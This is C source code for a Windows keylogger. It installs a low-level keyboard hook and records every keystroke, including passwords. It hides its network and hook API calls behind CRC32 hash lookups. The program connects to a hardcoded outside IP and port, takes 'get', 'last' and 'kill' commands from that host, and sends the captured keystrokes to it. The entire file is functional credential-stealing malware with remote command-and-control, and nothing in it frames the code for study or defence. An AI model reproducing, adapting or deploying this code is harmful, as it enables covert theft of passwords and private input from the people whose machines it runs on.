#include<winsock2.h>
#include<windows.h>
#include<stdio.h>
#include "CRC.h"
#define WM_END WM_APP+1
#define TIMEOUT 360000
#define BUF_SIZE 30
//#define DECLSPEC_IMPORT __declspec (dllimport)
HANDLE read,write;
FILETIME last_key;


typedef int __stdcall (*_WSAStartup)(WORD wVersionRequested,LPWSADATA lpWSAData) ;
typedef SOCKET __stdcall (*_socket)(int af,int type,int protocol) ;
typedef int __stdcall (*_setsockopt)(SOCKET s,int level,int optname,const char *optval,int optlen) ;
typedef int __stdcall (*_recv)(SOCKET s,char *buf,int len,int flags) ;
typedef int __stdcall (*_connect)(SOCKET s,const struct sockaddr *name,int namelen) ;
typedef int __stdcall (*_send)(SOCKET s,const char *buf,int len,int flags);
typedef int __stdcall (*_closesocket)(SOCKET s) ;


typedef LRESULT __stdcall (*_CallNextHookEx) (HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam) ;
typedef SHORT __stdcall (*_GetKeyState)(int nVirtKey) ;
typedef HHOOK __stdcall (*_SetWindowsHookExA) (int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId) ;


_WSAStartup CRC32_WSAStartup;
_socket CRC32_socket;
_setsockopt CRC32_setsockopt;
_recv CRC32_recv;
_connect CRC32_connect;
_closesocket CRC32_closesocket;
_send CRC32_send;

_CallNextHookEx  CRC32_CallNextHookEx;
_GetKeyState CRC32_GetKeyState;
_SetWindowsHookExA CRC32_SetWindowsHookExA;



LPVOID FuncAddr(LPVOID base,DWORD CheckSum){
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER)base)->e_lfanew );
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	PDWORD addrList,nameList;
	PWORD ordinalList;
	
	addrList = (PDWORD)(base+exp->AddressOfFunctions);
	nameList = (PDWORD)(base+exp->AddressOfNames);
	ordinalList = (PWORD)(base+exp->AddressOfNameOrdinals);
	
	int i=0;
	
	for(i=0;i<exp->NumberOfNames;i++){
		char * fname = (char *)(base+nameList[i]);
		//printf("Function Name : %s\n",fname);
		if(Crc32(fname,strlen(fname),0)==CheckSum){
			return (LPVOID)(base + addrList [ordinalList[i]]);
		}
		
	}
	
	return NULL;
}



void ResolveFunctionAddress(){
	LPVOID dll = LoadLibraryA("ws2_32.dll");
	
	
	CRC32_WSAStartup = FuncAddr(dll,2700475539);
	CRC32_socket = FuncAddr(dll,98920635);
	CRC32_setsockopt = FuncAddr(dll,3981526788);
	CRC32_recv = FuncAddr(dll,1507349165);
	CRC32_connect = FuncAddr(dll,1959786783);
	CRC32_closesocket = FuncAddr(dll,2781271927);
	CRC32_send = FuncAddr(dll,2809346765);
	
	dll = LoadLibraryA("user32.dll");
	
	
	CRC32_CallNextHookEx = FuncAddr(dll,3053185506);
	CRC32_GetKeyState = FuncAddr(dll,726731647);
	CRC32_SetWindowsHookExA = FuncAddr(dll,2315972327);
}

LRESULT CALLBACK proc(int code,WPARAM state,LPARAM p)
{
	BOOL caps,shift;

	KBDLLHOOKSTRUCT * k;
	if(code==0)
	{
		if(state==WM_KEYDOWN)
		{
			k=(KBDLLHOOKSTRUCT *)p;
			caps=CRC32_GetKeyState(VK_CAPITAL)&0x0001;
			shift=CRC32_GetKeyState(VK_SHIFT)>>15;
			char * key;
			switch (k->vkCode) // SWITCH ON INT
			{
				case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
				case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
				case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
				case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
				case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
				case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
				case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
				case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
				case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
				case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
				case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
				case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
				case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
				case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
				case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
				case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
				case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
				case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
				case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
				case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
				case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
				case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
				case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
				case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
				case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
				case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
				// Sleep Key
				case VK_SLEEP: key = "[SLEEP]"; break;
				// Num Keyboard
				case VK_NUMPAD0:  key = "0"; break;
				case VK_NUMPAD1:  key = "1"; break;
				case VK_NUMPAD2 : key = "2"; break;
				case VK_NUMPAD3:  key = "3"; break;
				case VK_NUMPAD4:  key = "4"; break;
				case VK_NUMPAD5:  key = "5"; break;
				case VK_NUMPAD6:  key = "6"; break;
				case VK_NUMPAD7:  key = "7"; break;
				case VK_NUMPAD8:  key = "8"; break;
				case VK_NUMPAD9:  key = "9"; break;
				case VK_MULTIPLY: key = "*"; break;
				case VK_ADD:      key = "+"; break;
				case VK_SEPARATOR: key = "-"; break;
				case VK_SUBTRACT: key = "-"; break;
				case VK_DECIMAL:  key = "."; break;
				case VK_DIVIDE:   key = "/"; break;
				// Function Keys
				case VK_F1:  key = "[F1]"; break;
				case VK_F2:  key = "[F2]"; break;
				case VK_F3:  key = "[F3]"; break;
				case VK_F4:  key = "[F4]"; break;
				case VK_F5:  key = "[F5]"; break;
				case VK_F6:  key = "[F6]"; break;
				case VK_F7:  key = "[F7]"; break;
				case VK_F8:  key = "[F8]"; break;
				case VK_F9:  key = "[F9]"; break;
				case VK_F10:  key = "[F10]"; break;
				case VK_F11:  key = "[F11]"; break;
				case VK_F12:  key = "[F12]"; break;
				case VK_F13:  key = "[F13]"; break;
				case VK_F14:  key = "[F14]"; break;
				case VK_F15:  key = "[F15]"; break;
				case VK_F16:  key = "[F16]"; break;
				case VK_F17:  key = "[F17]"; break;
				case VK_F18:  key = "[F18]"; break;
				case VK_F19:  key = "[F19]"; break;
				case VK_F20:  key = "[F20]"; break;
				case VK_F21:  key = "[F22]"; break;
				case VK_F22:  key = "[F23]"; break;
				case VK_F23:  key = "[F24]"; break;
				case VK_F24:  key = "[F25]"; break;
				// Keys
				case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
				case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
				case VK_BACK:    key = "[BACK]"; break;
				case VK_TAB:     key = "[TAB]"; break;
				case VK_CLEAR:   key = "[CLEAR]"; break;
				case VK_RETURN:  key = "[ENTER]"; break;
				case VK_SHIFT:   key = "[SHIFT]"; break;
				case VK_CONTROL: key = "[CTRL]"; break;
				case VK_MENU:    key = "[ALT]"; break;
				case VK_PAUSE:   key = "[PAUSE]"; break;
				case VK_CAPITAL: key = "[CAP-LOCK]"; break;
				case VK_ESCAPE:  key = "[ESC]"; break;
				case VK_SPACE:   key = "[SPACE]"; break;
				case VK_PRIOR:   key = "[PAGEUP]"; break;
				case VK_NEXT:    key = "[PAGEDOWN]"; break;
				case VK_END:     key = "[END]"; break;
				case VK_HOME:    key = "[HOME]"; break;
				case VK_LEFT:    key = "[LEFT]"; break;
				case VK_UP:      key = "[UP]"; break;
				case VK_RIGHT:   key = "[RIGHT]"; break;
				case VK_DOWN:    key = "[DOWN]"; break;
				case VK_SELECT:  key = "[SELECT]"; break;
				case VK_PRINT:   key = "[PRINT]"; break;
				case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
				case VK_INSERT:  key = "[INS]"; break;
				case VK_DELETE:  key = "[DEL]"; break;
				case VK_HELP:    key = "[HELP]"; break;
				// Number Keys with shift
				case 0x30:  key = shift ? ")" : "0"; break;
				case 0x31:  key = shift ? "!" : "1"; break;
				case 0x32:  key = shift ? "@" : "2"; break;
				case 0x33:  key = shift ? "#" : "3"; break;
				case 0x34:  key = shift ? "$" : "4"; break;
				case 0x35:  key = shift ? "%" : "5"; break;
				case 0x36:  key = shift ? "^" : "6"; break;
				case 0x37:  key = shift ? "&" : "7"; break;
				case 0x38:  key = shift ? "*" : "8"; break;
				case 0x39:  key = shift ? "(" : "9"; break;
				// Windows Keys
				case VK_LWIN:     key = "[WIN]"; break;
				case VK_RWIN:     key = "[WIN]"; break;
				case VK_LSHIFT:   key = "[SHIFT]"; break;
				case VK_RSHIFT:   key = "[SHIFT]"; break;
				case VK_LCONTROL: key = "[CTRL]"; break;
				case VK_RCONTROL: key = "[CTRL]"; break;
				// OEM Keys with shift
				case VK_OEM_1:      key = shift ? ":" : ";"; break;
				case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
				case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
				case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
				case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
				case VK_OEM_2:      key = shift ? "?" : "/"; break;
				case VK_OEM_3:      key = shift ? "~" : "`"; break;
				case VK_OEM_4:      key = shift ? "{" : "["; break;
				case VK_OEM_5:      key = shift ? "|" : "\\"; break;
				case VK_OEM_6:      key = shift ? "}" : "]"; break;
				case VK_OEM_7:      key = shift ? "\"" : "\'"; break; //TODO: Escape this char: "
				// Action Keys
				case VK_PLAY:       key = "[PLAY]";break;
				case VK_ZOOM:       key = "[ZOOM]";break;
				case VK_OEM_CLEAR:  key = "[CLEAR]";break;
				case VK_CANCEL:     key = "[CTRL-C]";break;

				default: key = "[UNK-KEY]";break;
			}
			
			GetSystemTimeAsFileTime(&last_key);
			WriteFile(write,key,strlen(key),NULL,NULL);
			

		}
	}
	return CRC32_CallNextHookEx(NULL, code, state, p);
}


void Keylogger(LPVOID p){
	MSG msg;HHOOK kb;
	kb=CRC32_SetWindowsHookExA(WH_KEYBOARD_LL,proc,GetModuleHandle(NULL),0);
	if(!kb)
	return ;

	
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
	    if(msg.message == WM_END)
        {
            PostQuitMessage(0);
        }
        else
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
		
		
	}
	
	
	UnhookWindowsHookEx(kb);
	
	return ;
}


int GetCommnad(char *cmd){
	
	if(!strcmp("get",cmd)){
		return 1;
	}
	
	else if(!strcmp("last",cmd)){
		return 2;
	}
	
	else if(!strcmp("kill",cmd)){
		return 3;
	}
	else
	return 0;
	
}


int Keylogger_Start(){
	SOCKET sock;
	struct sockaddr_in sr;
	DWORD ReciveTimeout = TIMEOUT;
	WSADATA wsa;
	char ch;
	char command[BUF_SIZE];
	BYTE BUFFER[1024];
	BOOL EXIT = 0;
	
	ZeroMemory(&sr,sizeof(sr));
	ZeroMemory(command,BUF_SIZE);
	
	sr.sin_addr.s_addr = 1673634241;// inet_addr("193.161.193.99");
	sr.sin_port = 0xd4da;//htons(56020);
	sr.sin_family = AF_INET;
	
	ResolveFunctionAddress();
	
	if(!CreatePipe(&read,&write,NULL,0)){
		printf("Failed to Create Pipe");
		return 1;
	}
	
	if(CRC32_WSAStartup(MAKEWORD(2,2),&wsa)){
		return 1;
	}
	
	HANDLE thread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Keylogger,NULL,0,NULL);
	
	if(!thread)
	return 1;
	
	
	__SOCKET__:
		sock = CRC32_socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(sock==INVALID_SOCKET){
			
			goto __SOCKET__;
		}
		
		
	CRC32_setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char *)&ReciveTimeout,sizeof(DWORD));
	
	
	__CONNECT__:
		if(CRC32_connect(sock,(SOCKADDR *)&sr,sizeof(sr))!=0){
			Sleep(90000);
			goto __CONNECT__;
		}
		
	
	
	while(CRC32_recv(sock,&ch,1,0)>0){
		
		if(ch=='\n'){
			DWORD j;
			int op = GetCommnad(command);
			//printf("%s-%d\n",command,op);
			switch(op){
				case 1:
					PeekNamedPipe(read,NULL,0,NULL,&j,NULL);
					while(j>0){
						ReadFile(read,BUFFER,1024,&op,NULL);
						j -= op;
						CRC32_send(sock,(char *)BUFFER,op,0);
					}
					CRC32_send(sock,"\n",1,0);
					break;
				case 2:
					CRC32_send(sock,&last_key,sizeof(last_key),0);
					//send(sock,"\n",1,0);
					break;
				case 3:
					EXIT=1;
					PostThreadMessage(GetThreadId(thread),WM_END,0,0L);
					break;
				default:
					break;
			}
			
			ZeroMemory(command,BUF_SIZE);
		}else{
			int len = strlen(command);
			if(len<=BUF_SIZE-1){
				command[len]=ch;
				ch=0;
			}
			else{
				ZeroMemory(command,BUF_SIZE);
			}
		}
		
		if(EXIT==1)
		break;
	}
	
	CRC32_closesocket(sock);
	if(EXIT!=1){
		goto __SOCKET__;
	}
	
	WaitForSingleObject(thread,INFINITE);
	
	CloseHandle(thread);
	CloseHandle(read);
	CloseHandle(write);
	return 0;
}


